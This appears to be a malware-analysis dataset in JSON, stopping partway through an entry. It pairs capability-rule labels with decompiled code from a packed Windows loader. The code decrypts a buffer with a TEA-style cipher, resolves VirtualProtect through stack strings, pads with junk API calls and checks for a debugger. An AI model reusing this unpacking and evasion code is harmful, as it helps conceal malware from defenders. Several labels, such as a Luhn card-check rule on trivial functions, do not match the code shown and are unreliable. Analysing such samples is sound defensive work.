{
    "004026a0": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid fcn.004026a0(void)\n\n{\n    *0x444f18 = 100;\n    *0x444f0e = 0x6d;\n    *0x444f1a = 0x6c;\n    *0x444f16 = 0x2e;\n    *0x444f1c = 0x6c;\n    *0x444f14 = 0x32;\n    *0x444f0c = 0x69;\n    *0x444f08 = 0x6d;\n    *0x444f0a = 0x73;\n    *0x444f12 = 0x33;\n    *0x444f1e = 0;\n    *0x444f10 = 0x67;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x444f08);\n    return;\n}\n",
        "token_count": 198
    },
    "00402750": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402750(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    *arg_8h = *arg_8h ^ arg_ch;\n    return;\n}\n",
        "token_count": 54
    },
    "00402775": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402775(uint32_t *arg_8h, int32_t *lpBytesRead)\n\n{\n    uint32_t uVar1;\n    int32_t extraout_EDX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint lpOutBuffer;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = *lpBytesRead;\n    var_1ch = lpBytesRead[1];\n    uVar2 = arg_8h[1];\n    var_14h = lpBytesRead[2];\n    var_ch = lpBytesRead[3];\n    uVar3 = *arg_8h;\n    var_4h = -0x3910c8e0;\n    var_18h = 0x9e3779b9;\n    if (*0x444f04 == 0x60b) {\n        (*_sym.imp.KERNEL32.dll_CallNamedPipeW)(0x40126c, 0, 0, &lpOutBuffer, 0, &lpBytesRead, 0);\n    }\n    do {\n        var_8h = uVar3 * 0x10 + var_14h;\n        uVar1 = (uVar3 >> 5) + var_ch;\n        *0x444ab4 = 0xffcf03fc;\n        fcn.00402750(&var_8h, var_4h + uVar3);\n        *0x444ab4 = 0;\n        *0x444abc = 0xffffffff;\n        uVar2 = uVar2 - (uVar1 ^ var_8h);\n        *0x444ab8 = 0xff6b3619;\n        uVar3 = uVar3 - (uVar2 * 0x10 + var_10h ^ (uVar2 >> 5) + var_1ch ^ var_4h + uVar2);\n        lpBytesRead = var_18h;\n        var_4h = var_4h - var_18h;\n    } while (extraout_EDX != 1);\n    *arg_8h = uVar3;\n    arg_8h[1] = uVar2;\n    return;\n}\n",
        "token_count": 537
    },
    "00402872": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402872(int32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    for (arg_ch = arg_ch >> 3; arg_ch != 0; arg_ch = arg_ch - 1) {\n        if (*0x444f04 == 0xb7d) {\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasesLengthW)(0);\n        }\n        if (*0x444f04 == 0x1c) {\n            (*_sym.imp.KERNEL32.dll_OpenMutexA)(0, 0, 0x401288);\n            (*_sym.imp.KERNEL32.dll_EnumDateFormatsW)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_EnumSystemCodePagesA)(0, 0);\n        }\n        fcn.00402775(arg_8h, arg_10h);\n        arg_8h = arg_8h + 8;\n    }\n    return;\n}\n",
        "token_count": 217
    },
    "004029eb": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.004029eb(void)\n\n{\n    uint var_4h;\n    \n    *0x41f96e = 0x33;\n    *0x41f96f = 0x32;\n    *0x41f973 = 0x6c;\n    *0x41f972 = 0x6c;\n    *0x41f96b = 0x6e;\n    *0x41f96d = 0x6c;\n    *0x41f968 = 0x6b;\n    *0x41f96c = 0x65;\n    *0x41f96a = 0x72;\n    *0x41f970 = 0x2e;\n    *0x41f971 = 100;\n    *0x41f969 = 0x65;\n    *0x41f974 = 0;\n    *0x444f00 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x41f968);\n    *0x41f973 = 0x65;\n    *0x41f969 = 0x69;\n    *0x41f96c = 0x75;\n    *0x41f96e = 0x6c;\n    *0x41f96d = 0x61;\n    *0x41f971 = 0x6f;\n    *0x41f975 = 0x74;\n    *0x41f968 = 0x56;\n    *0x41f974 = 99;\n    *0x41f96f = 0x50;\n    *0x41f976 = 0;\n    *0x41f96b = 0x74;\n    *0x41f972 = 0x74;\n    *0x41f96a = 0x72;\n    *0x41f970 = 0x72;\n    *0x41f964 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x444f00, 0x41f968);\n    (**0x41f964)(*0x444ab0, *0x444f04, 0x40, &var_4h);\n    return;\n}\n",
        "token_count": 489
    },
    "004042c2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x004043b5: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x004043ba)\n// WARNING: Removing unreachable block (ram,0x004043e8)\n// WARNING: Removing unreachable block (ram,0x004043c0)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004042c2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00403de4(0x40daf8, 0x18);\n    fcn.00406337(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x445374 != 1) {\n        *0x445370 = 1;\n        *0x44536c = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.004038c2(*0x446fe8);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.004038c2(*0x446fe4);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.004038b9();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.004038c2(*piVar2);\n                        iVar3 = fcn.004038b9();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.004038c2(*0x446fe8);\n                        piVar1 = fcn.004038c2(*0x446fe4);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.004041fc(0x401228);\n        }\n        fcn.004041fc(0x401230);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040625d(8);\n    }\n    return;\n}\n",
        "token_count": 790
    },
    "00406170": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00406170(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040625d(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "004061ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004061ac(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x41ed20) {\n        return;\n    }\n    *0x445ba0 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x445ba4 = &arg_8h;\n    *0x445ae0 = 0x10001;\n    *0x445a88 = 0xc0000409;\n    *0x445a8c = 1;\n    var_328h = *0x41ed20;\n    var_324h = *0x41ed24;\n    *0x445a94 = unaff_retaddr;\n    *0x445b6c = in_GS;\n    *0x445b70 = in_FS;\n    *0x445b74 = in_ES;\n    *0x445b78 = in_DS;\n    *0x445b7c = unaff_EDI;\n    *0x445b80 = unaff_ESI;\n    *0x445b84 = unaff_EBX;\n    *0x445b88 = in_EDX;\n    *0x445b8c = in_ECX;\n    *0x445b90 = in_EAX;\n    *0x445b94 = unaff_EBP;\n    *0x445b98 = unaff_retaddr;\n    *0x445b9c = in_CS;\n    *0x445ba8 = in_SS;\n    *0x445ad8 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.00408ff5(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x401c34);\n    if (*0x445ad8 == 0) {\n        fcn.00408ff5(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 830
    },
    "00409257": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00409257(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.004038b9();\n    var_4h = 0;\n    if (*0x445a74 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x401c28);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x401c1c);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x445a74 = fcn.00403847(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x401c0c);\n        *0x445a78 = fcn.00403847(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x401bf8);\n        *0x445a7c = fcn.00403847(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x401bdc);\n        *0x445a84 = fcn.00403847(uVar3);\n        if (*0x445a84 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x401bc4);\n            *0x445a80 = fcn.00403847(uVar3);\n        }\n    }\n    if ((*0x445a80 != iVar1) && (*0x445a84 != iVar1)) {\n        pcVar4 = fcn.004038c2(*0x445a80);\n        pcVar5 = fcn.004038c2(*0x445a84);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x00409399;\n        }\n    }\n    if ((((*0x445a78 != iVar1) && (pcVar4 = fcn.004038c2(*0x445a78),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x445a7c != iVar1 && (pcVar4 = fcn.004038c2(*0x445a7c),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x00409399:\n    pcVar4 = fcn.004038c2(*0x445a74);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 826
    },
    "00408979": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00408979(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00403de4(0x40dcb8, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.004044db();\n        *puVar2 = 0;\n        puVar2 = fcn.004044c8();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x446ec0)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x446ee0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040ab8b(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.004044c8();\n                    *puVar2 = 9;\n                    puVar2 = fcn.004044db();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00408246(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00408a4b(0x40dcb8);\n                goto code_r0x00408a45;\n            }\n        }\n        puVar2 = fcn.004044db();\n        *puVar2 = 0;\n        puVar2 = fcn.004044c8();\n        *puVar2 = 9;\n        fcn.00405471(0, 0, 0, 0, 0);\n    }\ncode_r0x00408a45:\n    fcn.00403e29();\n    return;\n}\n",
        "token_count": 630
    },
    "00402735": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402735(uint *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    *arg_8h = arg_10h;\n    return;\n}\n",
        "token_count": 54
    },
    "004029dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004029dd(void)\n\n{\n    *0x444ab0 = *0x444ab0 + 0x3b95;\n    return;\n}\n",
        "token_count": 37
    },
    "00402afd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpBytesLeftThisMessage\n// WARNING: Variable defined which should be unmapped: ListHead\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: lpTotalBytesAvail\n// WARNING: Variable defined which should be unmapped: lpBytesRead\n\nuint fcn.00402afd(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t unaff_ESI;\n    int32_t iVar4;\n    uint32_t arg_8h;\n    uint lpszVolumeName;\n    uint var_c3ch;\n    uint lpBuffer;\n    uint lpString1;\n    uint lpCPInfoEx;\n    uint uStackY192;\n    uint *puStackY188;\n    uint uStackY184;\n    uint uStackY180;\n    uint uStackY176;\n    uint uStackY172;\n    uint uStackY168;\n    uint uStackY164;\n    uint uStackY160;\n    uint *puStackY156;\n    uint uStackY152;\n    uint uStackY148;\n    uint uStackY144;\n    uint uStackY140;\n    uint *puStackY136;\n    uint uStackY132;\n    uint *puStackY128;\n    uint *puStackY124;\n    uint *puStackY120;\n    uint uStackY116;\n    uint *puStackY112;\n    uint uStackY108;\n    uint uStackY104;\n    uint uStackY100;\n    uint *puStackY96;\n    uint uStackY92;\n    uint uStackY88;\n    uint uStackY84;\n    uint uStackY80;\n    uint uStackY76;\n    uint uStackY72;\n    uint *puStackY68;\n    uint *hEvent;\n    uint uStackY60;\n    uint uStackY56;\n    uint *puStackY52;\n    uint uStackY48;\n    uint uStackY44;\n    uint var_24h;\n    uint *puStackY36;\n    uint uStackY32;\n    uint *ListHead;\n    uint *var_10h;\n    uint lpBytesRead;\n    uint32_t lpBytesLeftThisMessage;\n    int32_t lpTotalBytesAvail;\n    \n    lpTotalBytesAvail = 0x402b0a;\n    fcn.00403300();\n    iVar4 = 0;\n    lpBytesLeftThisMessage = unaff_ESI;\n    do {\n        if (iVar4 == 0x13e6) {\n            *0x444f04 = *0x444f04 + 0x38d6;\n        }\n        if (*0x444f04 == 0xbd8) {\n            lpBytesRead = 0;\n            var_10h = 0x402b36;\n            (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x31a652);\n    lpBytesRead = 0x402b44;\n    fcn.00402ae9();\n    arg_8h = 0;\n    if (*0x444f04 != 0) {\n        do {\n            var_10h = 0x402b54;\n            lpBytesLeftThisMessage = arg_8h;\n            fcn.004028d9(arg_8h);\n            if (*0x444f04 == 0x29) {\n                var_10h = 0x402b63;\n                (*_sym.imp.KERNEL32.dll_SetFileApisToANSI)();\n                var_10h = &fcn.00402afd::lpTotalBytesAvail;\n                ListHead = 0x402b6d;\n                (*_sym.imp.KERNEL32.dll_InterlockedDecrement)();\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h < *0x444f04);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_MoveFileA;\n    pcVar1 = _sym.imp.KERNEL32.dll_OpenMutexA;\n    lpTotalBytesAvail = 0x919802;\n    do {\n        if (*0x444f04 == 0x465) {\n            var_10h = 0x402ba0;\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasExesLengthA)();\n            var_10h = &fcn.00402afd::lpBytesLeftThisMessage;\n            ListHead = 0x402baa;\n            (*_sym.imp.KERNEL32.dll_InterlockedDecrement)();\n            ListHead = &fcn.00402afd::var_24h;\n            (*_sym.imp.KERNEL32.dll_GetConsoleSelectionInfo)();\n            uStackY32 = 0;\n            puStackY36 = NULL;\n            var_24h = 0x402bbd;\n            (*_sym.imp.KERNEL32.dll_FindResourceA)();\n            var_24h = 0;\n            uStackY44 = 0x402bc4;\n            (*_sym.imp.KERNEL32.dll_SetHandleCount)();\n            uStackY44 = 0;\n            uStackY48 = 0;\n            puStackY52 = NULL;\n            uStackY56 = 0x402bc9;\n            (*pcVar1)();\n            uStackY56 = 0;\n            uStackY60 = 0;\n            hEvent = 0x402bcd;\n            (*pcVar2)();\n            hEvent = &fcn.00402afd::hEvent;\n            puStackY68 = 0x402bd7;\n            (*_sym.imp.KERNEL32.dll_ResetEvent)();\n            puStackY68 = &fcn.00402afd::lpString1;\n            uStackY72 = 0;\n            uStackY76 = 0x402be5;\n            (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsA)();\n            uStackY76 = 0x4012ac;\n            uStackY80 = 0x4012cc;\n            uStackY84 = 0x402bf5;\n            (*_sym.imp.KERNEL32.dll_MoveFileW)();\n            uStackY84 = 0;\n            uStackY88 = 0;\n            uStackY92 = 0;\n            puStackY96 = NULL;\n            uStackY100 = 0;\n            uStackY104 = 0x402c00;\n            (*_sym.imp.KERNEL32.dll_WriteFile)();\n            uStackY104 = 0;\n            uStackY108 = 0;\n            puStackY112 = 0x402c08;\n            (*_sym.imp.KERNEL32.dll_DeactivateActCtx)();\n            puStackY112 = NULL;\n            uStackY116 = 0;\n            puStackY120 = NULL;\n            puStackY124 = 0x402c0d;\n            (*pcVar1)();\n            puStackY124 = &fcn.00402afd::lpBytesRead;\n            puStackY128 = NULL;\n            uStackY132 = 0x4012f4;\n            puStackY136 = NULL;\n            uStackY140 = 0;\n            uStackY144 = 0x402c1f;\n            (*_sym.imp.KERNEL32.dll_GetStringTypeExA)();\n            uStackY144 = 0;\n            uStackY148 = 0;\n            uStackY152 = 0;\n            puStackY156 = 0x402c28;\n            (*_sym.imp.KERNEL32.dll_WritePrivateProfileSectionA)();\n            puStackY156 = &fcn.00402afd::ListHead;\n            ListHead = NULL;\n            var_10h = NULL;\n            uStackY160 = 0x402c38;\n            (*_sym.imp.KERNEL32.dll_QueryDepthSList)();\n            uStackY160 = 0;\n            uStackY164 = 0;\n            uStackY168 = 0x402c40;\n            (*_sym.imp.KERNEL32.dll_EnumSystemLocalesW)();\n            uStackY168 = 0;\n            uStackY172 = 0;\n            uStackY176 = 0;\n            uStackY180 = 0;\n            uStackY184 = 0x402c4a;\n            (*_sym.imp.KERNEL32.dll_VerSetConditionMask)();\n            uStackY184 = 0;\n            puStackY188 = &fcn.00402afd::var_c3ch;\n            uStackY192 = 0x402c58;\n            (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)();\n        }\n        pcVar3 = _sym.imp.KERNEL32.dll_CopyFileW;\n        lpTotalBytesAvail = lpTotalBytesAvail + -1;\n    } while (lpTotalBytesAvail != 0);\n    if (*0x444f04 == 0x19c) {\n        var_10h = NULL;\n        ListHead = 0x401314;\n        uStackY32 = 0x402c8a;\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)();\n        uStackY32 = 0;\n        puStackY36 = NULL;\n        var_24h = 0;\n        uStackY44 = 0x402c8f;\n        (*pcVar3)();\n        uStackY44 = 0x40134c;\n        uStackY48 = 0;\n        puStackY52 = NULL;\n        uStackY56 = 0x402c9c;\n        (*_sym.imp.KERNEL32.dll_OpenJobObjectA)();\n        uStackY56 = 0;\n        uStackY60 = 0x402ca3;\n        (*_sym.imp.KERNEL32.dll_GlobalFindAtomA)();\n        uStackY60 = 0;\n        hEvent = 0x402caa;\n        (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n        hEvent = NULL;\n        puStackY68 = NULL;\n        uStackY72 = 0x402cb2;\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryW)();\n        uStackY72 = 0x40135c;\n        uStackY76 = 0x402cbd;\n        (*_sym.imp.KERNEL32.dll_lstrlenW)();\n        uStackY76 = 0;\n        uStackY80 = 0;\n        uStackY84 = 0;\n        uStackY88 = 0x402cc6;\n        (*_sym.imp.KERNEL32.dll_ClearCommError)();\n        uStackY88 = 0;\n        uStackY92 = 0;\n        puStackY96 = 0x402cce;\n        (*_sym.imp.KERNEL32.dll_SetVolumeMountPointA)();\n        puStackY96 = NULL;\n        uStackY100 = 0;\n        uStackY104 = 0x402cd6;\n        (*_sym.imp.KERNEL32.dll_GetConsoleTitleA)();\n        uStackY104 = 0;\n        uStackY108 = 0x402cdd;\n        (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)();\n        uStackY108 = 0;\n        puStackY112 = &fcn.00402afd::lpszVolumeName;\n        uStackY116 = 0;\n        puStackY120 = 0x402cec;\n        (*_sym.imp.KERNEL32.dll_FindNextVolumeW)();\n        puStackY120 = &fcn.00402afd::lpBytesLeftThisMessage;\n        puStackY124 = &fcn.00402afd::lpTotalBytesAvail;\n        puStackY128 = &fcn.00402afd::lpBytesRead;\n        uStackY132 = 0;\n        puStackY136 = &fcn.00402afd::lpBuffer;\n        uStackY140 = 0;\n        uStackY144 = 0x402d07;\n        (*_sym.imp.KERNEL32.dll_PeekNamedPipe)();\n        uStackY144 = 0;\n        uStackY148 = 0;\n        uStackY152 = 0x402d0b;\n        (*pcVar2)();\n        uStackY152 = 0;\n        puStackY156 = NULL;\n        uStackY160 = 0x402d13;\n        (*_sym.imp.KERNEL32.dll_SetConsoleCtrlHandler)();\n        uStackY160 = 0;\n        uStackY164 = 0x402d1a;\n        (*_sym.imp.KERNEL32.dll_ZombifyActCtx)();\n        uStackY164 = 0x40137c;\n        uStackY168 = 0x402d25;\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    }\n    iVar4 = 0;\n    do {\n        if (*0x444f04 == 0x15a) {\n            var_10h = &fcn.00402afd::lpBytesLeftThisMessage;\n            ListHead = 0x402d3d;\n            (*_sym.imp.KERNEL32.dll_GetNumberOfConsoleMouseButtons)();\n        }\n        if (iVar4 == 0xab9d) {\n            var_10h = 0x41f968;\n            ListHead = 0x402d50;\n            *0x444f00 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x2594b);\n    *0x41f968 = 0;\n    iVar4 = 0;\n    do {\n        if (iVar4 == 0x148) {\n            var_10h = 0x402d73;\n            fcn.004029eb();\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x427fa7);\n    var_10h = 0x40f010;\n    ListHead = *0x444f04;\n    uStackY32 = 0x402d92;\n    fcn.00402872(*0x444ab0, *0x444f04, 0x40f010);\n    iVar4 = 0;\n    do {\n        if (*0x444f04 == 0xba) {\n            uStackY32 = 0;\n            puStackY36 = 0x402da7;\n            (*_sym.imp.KERNEL32.dll_InterlockedDecrement)();\n        }\n        uStackY32 = 0;\n        puStackY36 = 0x402dae;\n        (*_sym.imp.KERNEL32.dll_GlobalFlags)();\n        if (iVar4 == 0x2f7e4) {\n            uStackY32 = 0x402dbb;\n            fcn.004029dd();\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x48122);\n    uStackY32 = 0x402dc9;\n    fcn.004026a0();\n    if (*0x444f04 == 0x58c) {\n        uStackY32 = 0x402ddd;\n        (*_sym.imp.KERNEL32.dll_LocalFree)();\n        uStackY32 = 0;\n        puStackY36 = &fcn.00402afd::lpszVolumeName;\n        var_24h = 0x402deb;\n        (*_sym.imp.KERNEL32.dll_FindFirstVolumeW)();\n        var_24h = 0;\n        uStackY44 = 0x402df2;\n        (*_sym.imp.KERNEL32.dll_GetConsoleSelectionInfo)();\n        uStackY44 = 0;\n        uStackY48 = 0;\n        puStackY52 = &fcn.00402afd::lpBytesLeftThisMessage;\n        uStackY56 = 0x402dfe;\n        (*_sym.imp.KERNEL32.dll_InterlockedCompareExchange)();\n        uStackY56 = 0;\n        uStackY60 = 0;\n        hEvent = NULL;\n        puStackY68 = 0x402e07;\n        (*_sym.imp.KERNEL32.dll_ContinueDebugEvent)();\n        puStackY68 = 0x401384;\n        uStackY72 = 0x402e12;\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n        uStackY72 = 0;\n        uStackY76 = 0;\n        uStackY80 = 0;\n        uStackY84 = 0x402e1b;\n        (*_sym.imp.KERNEL32.dll_FindResourceW)();\n        uStackY84 = 0;\n        uStackY88 = 0;\n        uStackY92 = 0;\n        puStackY96 = 0x402e20;\n        (*pcVar3)();\n        puStackY96 = &fcn.00402afd::lpCPInfoEx;\n        uStackY100 = 0;\n        uStackY104 = 0;\n        uStackY108 = 0x402e2f;\n        (*_sym.imp.KERNEL32.dll_GetCPInfoExW)();\n    }\n    fcn.004029d7();\n    return 0;\n}\n",
        "token_count": 3689
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
